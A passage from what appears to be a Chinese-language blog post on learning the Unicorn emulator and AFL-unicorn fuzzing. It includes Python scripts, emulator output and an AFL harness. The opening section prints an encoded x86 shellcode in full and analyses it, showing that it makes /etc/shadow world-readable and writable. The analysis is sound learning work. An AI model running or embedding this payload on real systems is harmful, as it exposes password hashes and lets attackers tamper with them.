UC_MODE_32)</span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b"\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80"</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, shellcode)</span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="comment"># print('&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size))</span></span><br><span class="line">    code = mu.mem_read(address,size)</span><br><span class="line">    <span class="comment"># print(code)</span></span><br><span class="line">    <span class="keyword">if</span> code == <span class="string">b"\xcd\x80"</span>:</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">        eax = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">        ebx = mu.reg_read(UC_X86_REG_EBX)</span><br><span class="line">        ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">        edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">        print(<span class="string">"&#123;&#125;: &#123;&#125; &#123;&#125; &#123;&#125;"</span>.format(eax,ebx,ecx,edx))</span><br><span class="line">        <span class="keyword">if</span>(eax == <span class="number">15</span>):</span><br><span class="line">            file_name = bytes(mu.mem_read(ebx,<span class="number">32</span>)).split(<span class="string">b'\x00'</span>)[<span class="number">0</span>]</span><br><span class="line">            print(<span class="string">"file_name is &#123;&#125;"</span>.format(file_name))</span><br><span class="line">        mu.reg_write(UC_X86_REG_EIP, address+size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(BASE,BASE+len(shellcode))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ python3 sc.py</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x40006b, instruction size &#x3D; 0x2</span><br><span class="line">15: 4194392 438 0</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x400070, instruction size &#x3D; 0x2</span><br><span class="line">1: 4194392 438 0</span><br></pre></td></tr></table></figure><p>打开系统调用的解释网站对照看一下。<br><a href="https://syscalls.kernelgrok.com/" target="_blank" rel="noopener">https://syscalls.kernelgrok.com/</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-152242.png" alt=""></p><p>查了一下chmod命令可以使用八进制数来指定权限。所以438就是666，代表读写权限。</p><p>hex(4194392)-&gt;’0x400058’,是一个指针，指向的是文件名的字符串，把这个字符串取出来就知道到底读的是什么文件了。<br>这里吐个槽python3的mu.mem_read(ebx,32)返回一个bytearray，需要先bytes(xx)转成bytes，浪费了我半小时，另外bytes split要用b’xxx’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; Tracing instruction at 0x40006b, instruction size &#x3D; 0x2</span><br><span class="line">15: 4194392 438 0</span><br><span class="line">file_name is b&#39;&#x2F;etc&#x2F;shadow&#39;</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x400070, instruction size &#x3D; 0x2</span><br><span class="line">1: 4194392 438 0</span><br></pre></td></tr></table></figure><p>这样我们就知道这个shellcode其实是将/etc/shadow设置成可读可写。</p><h3 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h3><p>gcc function.c -m32 -o function.<br>调用super_function，返回的方式1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//get length</span></span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr = a;</span><br><span class="line">    <span class="keyword">while</span>(*ptr)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr++;</span><br><span class="line">        len++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//comparestrings</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i]!=b[i])</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((stdcall))</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">super_function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    super_function(<span class="number">1</span>, <span class="string">"spiderman"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从前面的学习，我们已经学会了如何把程序加载进内存用unicorn仿真跑起来，和怎么用hook的方式去改变代码的执行流。<br>感觉解法很多…<br>分析一下题意，应该是指只调用super_function函数，而不执行代码的其他部分。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-135948.png" alt=""><br>假设基地址是0x08048000,那么要执行的就是0x08048000+0x57b-0x08048000+0x5b1</p><p>然后考虑32位传参，先看一下栈帧结构。<br>图来自CSAPP第二版。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-140207.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a==<span class="number">5</span> &amp;&amp; !<span class="built_in">strcmp</span>(b, <span class="string">"batman"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码可以看出，传入的参数a和b的值应为5和”batman”<br>从汇编代码最后的Ret 8可以看出来被调用者平衡堆栈，显然是stdcall调用约定。<br>stdcall的调用约定意味着参数从右向左压入堆栈。<br>当我们开始执行super_function的时候,esp是指向返回地址的。<br>所以a的值在esp+4,b的值在esp+8。（不理解的看图）<br>然后返回值会保存在eax里。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">BASE = <span class="number">0x8048000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line">string_addr = <span class="number">0x0</span></span><br><span class="line">mu.mem_write(string_addr, <span class="string">b"batman\x00"</span>)</span><br><span class="line">str = mu.mem_read(string_addr,<span class="number">6</span>)</span><br><span class="line">print(str)</span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./function"</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + <span class="number">1024</span>)</span><br><span class="line">mu.mem_write(STACK_ADDR + <span class="number">1024</span> + <span class="number">4</span>, p32(<span class="number">5</span>))</span><br><span class="line">mu.mem_write(STACK_ADDR + <span class="number">1024</span> + <span class="number">8</span>, p32(string_addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    (<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">    print(mu.mem_read(address,size))</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(BASE+<span class="number">0x57b</span>,BASE+<span class="number">0x5b1</span>)</span><br><span class="line">reg = mu.reg_read(UC_X86_REG_EAX)</span><br><span class="line">print(reg)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-151947.png" alt=""></p><p>到这里我的unicorn学习就结束了，感觉大概熟悉了一下API和使用。<br>另外ghrida真的不好用。。我准备换回IDA了。</p><h2 id="AFL-unicorn学习"><a href="#AFL-unicorn学习" class="headerlink" title="AFL-unicorn学习"></a>AFL-unicorn学习</h2><p>先在sec.today上找一下资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-04-152457.png" alt=""><br><a href="https://medium.com/hackernoon/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf" target="_blank" rel="noopener">https://medium.com/hackernoon/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf</a></p><p>第一篇我就不赘述了，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-023839.jpg" alt=""><br>稍微值得一提的就是这个图了，它使用AFL来mutate样本去生成数据，然后将数据读到一个固定的地址里，然后harness会从这个地址读取数据并运行要仿真的指令，如果出现crash，则模拟这个行为让harness崩溃，从而告知AFL crash发生，从而记录下crash样本。<br>harness基本上就是用了上面这些task里类似的方法去用unicorn把指令仿真执行起来，如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">   Simple test harness for AFL's Unicorn Mode.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   This loads the simple_target.bin binary (precompiled as MIPS code) into</span></span><br><span class="line"><span class="string">   Unicorn's memory map for emulation, places the specified input into</span></span><br><span class="line"><span class="string">   simple_target's buffer (hardcoded to be at 0x300000), and executes 'main()'.</span></span><br><span class="line"><span class="string">   If any crashes occur during emulation, this script throws a matching signal</span></span><br><span class="line"><span class="string">   to tell AFL that a crash occurred.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Run under AFL as follows:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   $ cd &lt;afl_path&gt;/unicorn_mode/samples/simple/</span></span><br><span class="line"><span class="string">   $ ../../../afl-fuzz -U -m none -i ./sample_inputs -o ./output -- python simple_test_harness.py @@ </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.mips_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to the file containing the binary to emulate</span></span><br><span class="line">BINARY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">'simple_target.bin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Memory map for the code to be tested</span></span><br><span class="line">CODE_ADDRESS  = <span class="number">0x00100000</span>  <span class="comment"># Arbitrary address where code to test will be loaded</span></span><br><span class="line">CODE_SIZE_MAX = <span class="number">0x00010000</span>  <span class="comment"># Max size for the code (64kb)</span></span><br><span class="line">STACK_ADDRESS = <span class="number">0x00200000</span>  <span class="comment"># Address of the stack (arbitrarily chosen)</span></span><br><span class="line">STACK_SIZE    = <span class="number">0x00010000</span>  <span class="comment"># Size of the stack (arbitrarily chosen)</span></span><br><span class="line">DATA_ADDRESS  = <span class="number">0x00300000</span>  <span class="comment"># Address where mutated data will be placed</span></span><br><span class="line">DATA_SIZE_MAX = <span class="number">0x00010000</span>  <span class="comment"># Maximum allowable size of mutated data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># If Capstone is installed then we'll dump disassembly, otherwise just dump the binary.</span></span><br><span class="line">    <span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">    cs = Cs(CS_ARCH_MIPS, CS_MODE_MIPS32 + CS_MODE_BIG_ENDIAN)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">        mem = uc.mem_read(address, size)</span><br><span class="line">        <span class="keyword">for</span> (cs_address, cs_size, cs_mnemonic, cs_opstr) <span class="keyword">in</span> cs.disasm_lite(bytes(mem), size):</span><br><span class="line">            print(<span class="string">"    Instr: &#123;:#016x&#125;:\t&#123;&#125;\t&#123;&#125;"</span>.format(address, cs_mnemonic, cs_opstr))</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">        print(<span class="string">"    Instr: addr=0x&#123;0:016x&#125;, size=0x&#123;1:016x&#125;"</span>.format(address, size))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_block</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">    print(<span class="string">"Basic Block: addr=0x&#123;0:016x&#125;, size=0x&#123;1:016x&#125;"</span>.format(address, size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_mem_access</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; Write: addr=0x&#123;0:016x&#125; size=&#123;1&#125; data=0x&#123;2:016x&#125;"</span>.format(address, size, value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; Read: addr=0x&#123;0:016x&#125; size=&#123;1&#125;"</span>.format(address, size))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_debug_mem_invalid_access</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> access == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; INVALID Write: addr=0x&#123;0:016x&#125; size=&#123;1&#125; data=0x&#123;2:016x&#125;"</span>.format(address, size, value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"        &gt;&gt;&gt; INVALID Read: addr=0x&#123;0:016x&#125; size=&#123;1&#125;"</span>.format(address, size))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_crash</span><span class="params">(uc_error)</span>:</span></span><br><span class="line">    <span class="comment"># This function should be called to indicate to AFL that a crash occurred during emulation.</span></span><br><span class="line">    <span class="comment"># Pass in the exception received from Uc.emu_start()</span></span><br><span class="line">    mem_errors = [</span><br><span class="line">        UC_ERR_READ_UNMAPPED, UC_ERR_READ_PROT, UC_ERR_READ_UNALIGNED,</span><br><span class="line">        UC_ERR_WRITE_UNMAPPED, UC_ERR_WRITE_PROT, UC_ERR_WRITE_UNALIGNED,</span><br><span class="line">        UC_ERR_FETCH_UNMAPPED, UC_ERR_FETCH_PROT, UC_ERR_FETCH_UNALIGNED,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> uc_error.errno <span class="keyword">in</span> mem_errors:</span><br><span class="line">        <span class="comment"># Memory error - throw SIGSEGV</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGSEGV)</span><br><span class="line">    <span class="keyword">elif</span> uc_error.errno == UC_ERR_INSN_INVALID:</span><br><span class="line">        <span class="comment"># Invalid instruction - throw SIGILL</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGILL)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># Not sure what happened - throw SIGABRT</span></span><br><span class="line">        os.kill(os.getpid(), signal.SIGABRT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"Test harness for simple_target.bin"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input to load"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Enables debug tracing"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate a MIPS32 big endian Unicorn Engine instance</span></span><br><span class="line">    uc = Uc(UC_ARCH_MIPS, UC_MODE_MIPS32 + UC_MODE_BIG_ENDIAN)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.debug:</span><br><span class="line">        uc.hook_add(UC_HOOK_BLOCK, unicorn_debug_block)</span><br><span class="line">        uc.hook_add(UC_HOOK_CODE, unicorn_debug_instruction)</span><br><span class="line">        uc.hook_add(UC_HOOK_MEM_WRITE | UC_HOOK_MEM_READ, unicorn_debug_mem_access)</span><br><span class="line">        uc.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED | UC_HOOK_MEM_READ_INVALID, unicorn_debug_mem_invalid_access)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#---------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Load the binary to emulate and map it into memory</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading data input from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">    binary_file = open(BINARY_FILE, <span class="string">'rb'</span>)</span><br><span class="line">    binary_code = binary_file.read()</span><br><span class="line">    binary_file.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Apply constraints to the mutated input</span></span><br><span class="line">    <span class="keyword">if</span> len(binary_code) &gt; CODE_SIZE_MAX:</span><br><span class="line">        print(<span class="string">"Binary code is too large (&gt; &#123;&#125; bytes)"</span>.format(CODE_SIZE_MAX))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the mutated command into the data buffer</span></span><br><span class="line">    uc.mem_map(CODE_ADDRESS, CODE_SIZE_MAX)</span><br><span class="line">    uc.mem_write(CODE_ADDRESS, binary_code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set the program counter to the start of the code</span></span><br><span class="line">    start_address = CODE_ADDRESS          <span class="comment"># Address of entry point of main()</span></span><br><span class="line">    end_address   = CODE_ADDRESS + <span class="number">0xf4</span>   <span class="comment"># Address of last instruction in main()</span></span><br><span class="line">    uc.reg_write(UC_MIPS_REG_PC, start_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------</span></span><br><span class="line">    <span class="comment"># Setup the stack</span></span><br><span class="line"></span><br><span class="line">    uc.mem_map(STACK_ADDRESS, STACK_SIZE)</span><br><span class="line">    uc.reg_write(UC_MIPS_REG_SP, STACK_ADDRESS + STACK_SIZE)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------------------------------------------</span></span><br><span class="line">    <span class="comment"># Emulate 1 instruction to kick off AFL's fork server</span></span><br><span class="line">    <span class="comment">#   THIS MUST BE DONE BEFORE LOADING USER DATA! </span></span><br><span class="line">    <span class="comment">#   If this isn't done every single run, the AFL fork server </span></span><br><span class="line">    <span class="comment">#   will not be started appropriately and you'll get erratic results!</span></span><br><span class="line">    <span class="comment">#   It doesn't matter what this returns with, it just has to execute at</span></span><br><span class="line">    <span class="comment">#   least one instruction in order to get the fork server started.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    print(<span class="string">"Starting the AFL forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(uc.reg_read(UC_MIPS_REG_PC), <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#-----------------------------------------------</span></span><br><span class="line">    <span class="comment"># Load the mutated input and map it into memory</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load the mutated input from disk</span></span><br><span class="line">    print(<span class="string">"Loading data input from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">    input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">    input = input_file.read()</span><br><span class="line">    input_file.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Apply constraints to the mutated input</span></span><br><span class="line">    <span class="keyword">if</span> len(input) &gt; DATA_SIZE_MAX:</span><br><span class="line">        print(<span class="string">"Test input is too long (&gt; &#123;&#125; bytes)"</span>.format(DATA_SIZE_MAX))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the mutated command into the data buffer</span></span><br><span class="line">    uc.mem_map(DATA_ADDRESS, 